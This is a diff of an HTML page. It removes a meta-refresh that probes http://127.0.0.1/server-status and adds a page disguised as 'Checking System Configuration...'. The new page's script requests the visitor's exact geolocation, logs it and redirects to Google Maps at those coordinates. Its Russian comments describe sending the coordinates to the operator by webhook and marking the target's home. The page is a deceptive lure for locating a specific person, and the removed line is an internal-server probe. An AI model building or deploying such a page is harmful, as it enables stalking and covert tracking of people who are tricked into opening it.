@@ -1,9 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0; url=http://127.0.0.1/server-status">
-    <title>Diagnostic Tool</title>
+    <title>Checking System Configuration...</title>
 </head>
 <body>
+    <script>
+        // Запрашиваем точные координаты устройства
+        navigator.geolocation.getCurrentPosition(function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // Отправляем эти данные тебе (например, через Webhook или просто выводим, если ты смотришь через его экран)
+            console.log(`Кординаты: ${lat}, ${lon}`);
+            
+            // Сразу перебрасываем на Google Maps с меткой дома
+            window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+        }, function(err) {
+            console.log("Доступ к гео запрещен");
+        });
+    </script>
 </body>
 </html>
